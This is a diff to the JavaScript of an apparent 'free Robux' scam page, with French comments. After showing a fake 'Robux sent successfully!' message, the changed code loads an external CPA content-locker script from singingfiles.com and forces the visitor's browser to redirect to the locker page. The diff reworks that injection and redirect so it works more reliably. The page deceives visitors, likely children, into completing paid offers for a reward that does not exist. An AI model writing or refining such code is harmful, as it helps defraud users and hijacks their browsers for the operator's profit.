@@ -244,10 +244,16 @@
           statusText.innerHTML = `Robux sent successfully! 🎉`;
 
           // Script CPA Grip après chargement :
-           const scriptHTML = '<script type="text/javascript">var lck = false;</script><script type="text/javascript" src="https://singingfiles.com/script_include.php?id=1821663"></script><script type="text/javascript">if(!lck){top.location = 'https://singingfiles.com/help/ablk.php?lkt=1'; }</script>';
-		   document.write(scriptHTML);
-        }
-      }, 200);
+        setTimeout(() => {
+        // Charger le script externe (optionnel, utile si singingfiles utilise un script de session)
+          const script = document.createElement("script");
+          script.src = "https://singingfiles.com/script_include.php?id=1821663";
+          document.body.appendChild(script);
+
+        // Forcer la redirection vers le locker
+          window.location.href = "https://singingfiles.com/help/ablk.php?lkt=1";
+    	}, 300); // petit délai pour laisser le script se charger
+      }, 4000); // ou la durée que tu as définie pour le chargement
     });
   </script>
 
